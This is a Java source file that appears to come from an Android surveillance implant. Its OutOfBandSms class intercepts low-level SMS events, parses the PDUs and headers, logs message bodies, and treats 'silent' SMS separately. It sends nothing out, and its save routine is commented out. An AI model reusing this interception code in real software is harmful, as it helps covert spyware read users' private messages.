package com.android.dvci.module.message;

import android.telephony.SmsMessage;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.LowEvent;
import com.android.dvci.util.LowEventMsg;
import com.android.dvci.util.SmsHeader;
import com.android.dvci.util.SmsMessageBase;

/**
 * Created by zad on 05/06/15.
 */
public class OutOfBandSms {
	private static final String TAG = "OutOfBandSms"; //$NON-NLS-1$
	public static SmsMessageBase smsBase;
	public static SmsMessage sms;
	public static SmsHeader smsHeader;

	public static void processPdu(byte[] pdu) {
		sms = SmsMessage.createFromPdu(pdu);
		if (Cfg.DEBUG) {
			Check.log(TAG + "  processPdu: processing '" + sms.getMessageBody() + "',PDU=" + sms.getProtocolIdentifier());
		}

		try {

			smsBase = new SmsMessageBase(pdu);
			if(smsBase != null) {
				smsBase.parseUserData();
				smsHeader = smsBase.getUserDataHeader();
			}
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + "  processPdu: failure getting header :", e);
			}
		}
	}

	public static int silentSmsPdu(LowEvent<byte[]> lsms) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "  silentSmsPdu: start ok ");
		}
		int callOrig = 1;
		if (lsms.data.length==0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "  silentSmsPdu: pdus zero size ");
			}
			return callOrig;
		}

		//saveLowEventPdu(lsms.data,null);
		return callOrig;
	}


	public static int dispatchNormalMessagePdu(LowEvent<byte[]> lsms) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "  dispatchNormalMessagePdu: start ok ");
		}
		int callOrig = 1;
		if (lsms.data.length==0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "  dispatchNormalMessagePdu: pdus zero size ");
			}
			return callOrig;
		}
		return callOrig;
	}
	public OutOfBandSms(LowEventSms lls) {
		processPdu(lls.sms_event.data);
		if( lls.sms_event.type  != LowEventMsg.EVENT_TYPE_SMS_SILENT){
			dispatchNormalMessagePdu(lls.sms_event);
		}
	}

}
